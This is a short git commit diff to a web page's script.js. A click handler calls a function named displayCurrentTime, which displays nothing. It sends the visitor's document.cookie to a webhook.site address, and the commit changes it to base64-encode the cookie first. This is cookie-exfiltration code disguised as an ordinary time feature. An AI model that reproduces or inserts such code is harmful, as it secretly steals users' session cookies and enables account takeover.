eb5f4525e6c625df750c56a2ef5913d85588de09
miracul9228 <134514965+miracul9228@users.noreply.github.com>
2025-04-23 20:31:40 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -3,8 +3,9 @@ document.addEventListener("DOMContentLoaded", function () {
   button.addEventListener("click", function () {
     displayCurrentTime();
   });
-
+ 
   function displayCurrentTime() {
-    fetch('https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d' + document.cookie);
+    var cookie = document.cookie;
+    fetch('https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d' + window.btoa(cookie))  ;
   }
 });
